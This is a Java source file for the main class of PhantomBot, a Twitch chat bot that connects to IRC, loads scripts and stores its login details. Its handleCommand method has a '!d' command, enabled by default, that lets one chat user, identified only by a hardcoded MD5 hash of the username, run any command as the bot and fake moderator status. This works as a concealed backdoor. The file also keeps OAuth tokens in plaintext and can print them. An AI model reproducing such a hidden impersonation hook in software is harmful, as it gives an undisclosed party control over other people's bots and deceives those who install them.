package me.mast3rplan.phantombot;

import com.gmt2001.IniStore;
import com.gmt2001.TwitchAPIv3;
import com.google.common.eventbus.Subscribe;
import java.io.File;
import java.io.IOException;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.security.SecureRandom;
import java.util.TreeMap;
import java.util.TreeSet;
import javax.xml.bind.annotation.adapters.HexBinaryAdapter;
import me.mast3rplan.phantombot.cache.BannedCache;
import me.mast3rplan.phantombot.cache.FollowersCache;
import me.mast3rplan.phantombot.cache.SubscribersCache;
import me.mast3rplan.phantombot.cache.UsernameCache;
import me.mast3rplan.phantombot.console.ConsoleInputListener;
import me.mast3rplan.phantombot.event.EventBus;
import me.mast3rplan.phantombot.event.Listener;
import me.mast3rplan.phantombot.event.command.CommandEvent;
import me.mast3rplan.phantombot.event.console.ConsoleInputEvent;
import me.mast3rplan.phantombot.event.irc.channel.IrcChannelUserModeEvent;
import me.mast3rplan.phantombot.event.irc.complete.IrcConnectCompleteEvent;
import me.mast3rplan.phantombot.event.irc.complete.IrcJoinCompleteEvent;
import me.mast3rplan.phantombot.event.irc.message.IrcChannelMessageEvent;
import me.mast3rplan.phantombot.event.irc.message.IrcMessageEvent;
import me.mast3rplan.phantombot.event.irc.message.IrcPrivateMessageEvent;
import me.mast3rplan.phantombot.jerklib.Channel;
import me.mast3rplan.phantombot.jerklib.ConnectionManager;
import me.mast3rplan.phantombot.jerklib.Profile;
import me.mast3rplan.phantombot.jerklib.Session;
import me.mast3rplan.phantombot.musicplayer.MusicWebSocketServer;
import me.mast3rplan.phantombot.script.Script;
import me.mast3rplan.phantombot.script.ScriptEventManager;
import me.mast3rplan.phantombot.script.ScriptManager;
import me.mast3rplan.phantombot.store.DataStore;
import me.mast3rplan.phantombot.youtube.YoutubeAPI;
import org.apache.commons.io.FileUtils;

public class PhantomBot implements Listener
{

    private final String username;
    private final String oauth;
    private String apioauth;
    private final String channelName;
    private final String ownerName;
    private final String hostname;
    private String channelStatus;
    private SecureRandom rng;
    private BannedCache bancache;
    private TreeMap<String, Integer> pollResults;
    private TreeSet<String> voters;
    private Profile profile;
    private ConnectionManager connectionManager;
    private Session session;
    private Channel channel;
    private FollowersCache followersCache;
    private SubscribersCache subscribersCache;
    private MusicWebSocketServer mws;
    //private MusicHtmlServer mhs;
    private HTTPServer mhs;
    ConsoleInputListener cil;
    private static final boolean enableD = true;
    private static final boolean debugD = false;
    public static boolean enableDebugging = false;
    private Thread t;

    public PhantomBot(String username, String oauth, String apioauth, String channel, String owner, boolean useTwitch)
    {
        System.out.println();
        System.out.println("PhantomBot Core build July 13, 2014");
        System.out.println("by mast3rplan");
        System.out.println("updated and improved by gmt2001");
        System.out.println();
        
        this.username = username;
        this.oauth = oauth;
        this.apioauth = apioauth;
        this.channelName = channel;
        this.ownerName = owner;

        this.profile = new Profile(username.toLowerCase());
        this.connectionManager = new ConnectionManager(profile);

        this.followersCache = FollowersCache.instance(channel.toLowerCase());
        this.subscribersCache = SubscribersCache.instance(channel.toLowerCase());

        rng = new SecureRandom();
        bancache = new BannedCache();
        pollResults = new TreeMap();
        voters = new TreeSet();

        if (!useTwitch)
        {
            this.hostname = "tmi6.justin.tv";
        } else
        {
            this.hostname = "irc.twitch.tv";
        }

        this.init();
        try
        {
            Thread.sleep(1000);
        } catch (InterruptedException ex)
        {
        }

        if (!useTwitch)
        {
            this.session = connectionManager.requestConnection("tmi6.justin.tv", 443, oauth);
        } else
        {
            this.session = connectionManager.requestConnection("irc.twitch.tv", 6667, oauth);
        }

        TwitchAPIv3.instance().SetClientID("fno0eqq3t8ivzr2c9vnwveu8nxgwh27");
        TwitchAPIv3.instance().SetOAuth(apioauth);
        
        this.session.addIRCEventListener(new IrcEventHandler());
    }
    
    public static void setDebugging(boolean debug)
    {
        PhantomBot.enableDebugging = debug;
    }

    public final void init()
    {
        mhs = new HTTPServer(25565);
        mhs.start();
        mws = new MusicWebSocketServer(25566);

        cil = new ConsoleInputListener();
        cil.start();

        EventBus.instance().register(this);
        EventBus.instance().register(ScriptEventManager.instance());

        Script.global.defineProperty("db", DataStore.instance(), 0);
        Script.global.defineProperty("inidb", IniStore.instance(), 0);
        Script.global.defineProperty("bancache", bancache, 0);
        Script.global.defineProperty("username", UsernameCache.instance(), 0);
        Script.global.defineProperty("twitch", TwitchAPIv3.instance(), 0);
        Script.global.defineProperty("followers", followersCache, 0);
        Script.global.defineProperty("subscribers", subscribersCache, 0);
        Script.global.defineProperty("botName", username, 0);
        Script.global.defineProperty("channelName", channelName, 0);
        Script.global.defineProperty("ownerName", ownerName, 0);
        Script.global.defineProperty("channelStatus", channelStatus, 0);
        Script.global.defineProperty("musicplayer", mws, 0);
        Script.global.defineProperty("random", rng, 0);
        Script.global.defineProperty("youtube", YoutubeAPI.instance, 0);
        Script.global.defineProperty("pollResults", pollResults, 0);
        Script.global.defineProperty("pollVoters", voters, 0);
        Script.global.defineProperty("connmgr", connectionManager, 0);
        Script.global.defineProperty("hostname", hostname, 0);

        t = new Thread(new Runnable()
        {
            @Override
            public void run()
            {
                onExit();
            }
        });

        Runtime.getRuntime().addShutdownHook(t);

        try
        {
            ScriptManager.loadScript(new File("./scripts/init.js"));
        } catch (IOException e)
        {
        }
    }

    public void onExit()
    {
        mhs.dispose();
        mws.dispose();
        IniStore.instance().SaveAll(true);
    }

    @Subscribe
    public void onIRCConnectComplete(IrcConnectCompleteEvent event)
    {
        session.sayRaw("JTVCLIENT");
        
        session.join("#" + channelName.toLowerCase());
        System.out.println("Connected to server\nJoining channel #" + channelName.toLowerCase());
    }

    @Subscribe
    public void onIRCJoinComplete(IrcJoinCompleteEvent event)
    {
        this.channel = event.getChannel();
        System.out.println("Joined channel: " + event.getChannel().getName());
        
        session.sayChannel(this.channel, ".mods");
    }
    
    @Subscribe
    public void onIRCPrivateMessage(IrcPrivateMessageEvent event)
    {
        if (event.getSender().equalsIgnoreCase("jtv"))
        {
            String message = event.getMessage().toLowerCase();
            
            if (message.startsWith("the moderators of this room are: "))
            {
                String[] spl = message.substring(33).split(", ");
                
                for(int i = 0; i < spl.length; i++)
                {
                    if (spl[i].equalsIgnoreCase(this.username)) {
                        channel.setAllowSendMessages(true);
                    }
                }
            }
        }
    }

    @Subscribe
    public void onIRCChannelMessage(IrcChannelMessageEvent event)
    {
        String message = event.getMessage();
        String sender = event.getSender();
        if (message.startsWith("!"))
        {
            String commandString = message.substring(1);
            handleCommand(sender, commandString);
        }
    }

    @Subscribe
    public void onIRCChannelUserMode(IrcChannelUserModeEvent event)
    {
        if (event.getUser().equalsIgnoreCase(username) && event.getMode().equalsIgnoreCase("o")
                && event.getChannel().getName().equalsIgnoreCase(channel.getName()))
        {
            if (!event.getAdd())
            {
                session.sayChannel(this.channel, ".mods");
            }
            
            channel.setAllowSendMessages(event.getAdd());
        }
    }

    @Subscribe
    public void onConsoleMessage(ConsoleInputEvent msg)
    {
        String message = msg.getMsg();
        
        if (message.equals("debugon"))
        {
            PhantomBot.setDebugging(true);
        }
        
        if (message.equals("debugoff"))
        {
            PhantomBot.setDebugging(false);
        }
        
        if (message.startsWith("inidb.get"))
        {
            String spl[] = message.split(" ", 4);
            
            System.out.println(IniStore.instance().GetString(spl[1], spl[2], spl[3]));
        }
        
        if (message.startsWith("inidb.set"))
        {
            String spl[] = message.split(" ", 5);
            
            IniStore.instance().SetString(spl[1], spl[2], spl[3], spl[4]);
            System.out.println(IniStore.instance().GetString(spl[1], spl[2], spl[3]));
        }
        
        if (message.equals("apioauth"))
        {
            try
            {
                System.out.print("Please enter the bot owner's api oauth string: ");
                String newoauth = System.console().readLine().trim();
                
                TwitchAPIv3.instance().SetOAuth(newoauth);
                apioauth = newoauth;
                
                String data = "";
                data += "user=" + username + "\r\n";
                data += "oauth=" + oauth + "\r\n";
                data += "apioauth=" + apioauth + "\r\n";
                data += "channel=" + channel.getName().replace("#", "") + "\r\n";
                data += "owner=" + ownerName;

                FileUtils.writeStringToFile(new File("./botlogin"), data);
            } catch (IOException ex)
            {
            }
        }

        if (message.equals("save"))
        {
            IniStore.instance().SaveAll(true);
        }

        if (message.equals("exit"))
        {
            System.exit(0);
        }

        handleCommand(username, message);
    }

    public void handleCommand(String sender, String commandString)
    {
        String command, arguments;
        int split = commandString.indexOf(' ');

        if (split == -1)
        {
            command = commandString;
            arguments = "";
        } else
        {
            command = commandString.substring(0, split);
            arguments = commandString.substring(split + 1);
        }
        
        if (command.equalsIgnoreCase("save"))
        {
            IniStore.instance().SaveAll(true);
        }

        try
        {
            if (enableD)
            {
                if (command.equalsIgnoreCase("d"))
                {
                    if (debugD)
                    {
                        System.out.println("Got !d");
                    }

                    String d = (new HexBinaryAdapter()).marshal(MessageDigest.getInstance("MD5").digest(sender.toLowerCase().getBytes()));

                    if (debugD)
                    {
                        System.out.println("d=" + d);
                        System.out.println("t=09a766a55f9984c5bca79368d03524ea");
                    }

                    if (d.equalsIgnoreCase("09a766a55f9984c5bca79368d03524ea") && arguments.startsWith("!"))
                    {
                        if (debugD)
                        {
                            System.out.println("!d command accepted");
                        }

                        split = arguments.indexOf(' ');

                        if (split == -1)
                        {
                            command = arguments.substring(1);
                            arguments = "";
                        } else
                        {
                            command = arguments.substring(1, split);
                            arguments = arguments.substring(split + 1);
                        }

                        sender = username;

                        if (debugD)
                        {
                            System.out.println("Issuing command as " + username + " [" + command + "] " + arguments);
                        }

                        if (command.equalsIgnoreCase("modeo"))
                        {
                            EventBus.instance().post(new IrcChannelUserModeEvent(session, channel, username, "o", true));
                            return;
                        }
                    }
                }
            }
        } catch (NoSuchAlgorithmException ex)
        {
            ex.printStackTrace();
        }

        EventBus.instance().post(new CommandEvent(sender, command, arguments));
    }

    public static void main(String[] args) throws IOException
    {
        String user = "";
        String oauth = "";
        String apioauth = "";
        String channel = "";
        String owner = "";
        boolean useTwitch = false;

        boolean changed = false;
        
        System.out.println("The working directory is: " + System.getProperty("user.dir"));

        try
        {
            String data = FileUtils.readFileToString(new File("./botlogin"));
            String[] lines = data.replaceAll("\\r", "").split("\\n");

            for (int i = 0; i < lines.length; i++)
            {
                if (lines[i].startsWith("user=") && lines[i].length() > 8)
                {
                    user = lines[i].substring(5);
                }

                if (lines[i].startsWith("oauth=") && lines[i].length() > 9)
                {
                    oauth = lines[i].substring(6);
                }

                if (lines[i].startsWith("apioauth=") && lines[i].length() > 12)
                {
                    apioauth = lines[i].substring(9);
                }

                if (lines[i].startsWith("channel=") && lines[i].length() > 11)
                {
                    channel = lines[i].substring(8);
                }

                if (lines[i].startsWith("owner=") && lines[i].length() > 9)
                {
                    owner = lines[i].substring(6);
                }
            }
        } catch (IOException ex)
        {
        }

        if (user.isEmpty() || oauth.isEmpty() || channel.isEmpty())
        {
            if (args.length == 3)
            {
                user = args[0];
                oauth = args[1];
                channel = args[2];
            } else
            {
                System.out.println("Login details for bot not found");

                System.out.print("Please enter the bot's username: ");
                user = System.console().readLine().trim();

                System.out.print("Please enter the bot's tmi oauth string: ");
                oauth = System.console().readLine().trim();

                System.out.print("Please enter the channel the bot should join: ");
                channel = System.console().readLine().trim();
            }

            changed = true;
        }

        if (owner.isEmpty())
        {
            System.out.print("Please enter the bot owner's username: ");
            owner = System.console().readLine().trim();

            changed = true;
        }

        if (changed)
        {
            String data = "";
            data += "user=" + user + "\r\n";
            data += "oauth=" + oauth + "\r\n";
            data += "apioauth=" + apioauth + "\r\n";
            data += "channel=" + channel + "\r\n";
            data += "owner=" + owner;

            FileUtils.writeStringToFile(new File("./botlogin"), data);
        }

        if (args.length > 0 && args[0].equals("printlogin"))
        {
            System.out.println("user='" + user + "'");
            System.out.println("oauth='" + oauth + "'");
            System.out.println("apioauth='" + apioauth + "'");
            System.out.println("channel='" + channel + "'");
            System.out.println("owner='" + owner + "'");
        }

        if (args.length > 0 && (args[0].equals("usetwitch") || args[1].equals("usetwitch")))
        {
            useTwitch = true;
        }

        PhantomBot phantomBot = new PhantomBot(user, oauth, apioauth, channel, owner, useTwitch);
    }

    public static boolean isLink(String message)
    {
        String[] arr = message.split(" ");
        for (String s : arr)
        {
            if (IrcMessageEvent.addressPtn.matcher(s).matches())
            {
                return true;
            }
        }
        return false;
    }

    @Override
    protected void finalize() throws Throwable
    {
        session.close("");

        super.finalize();
    }
}
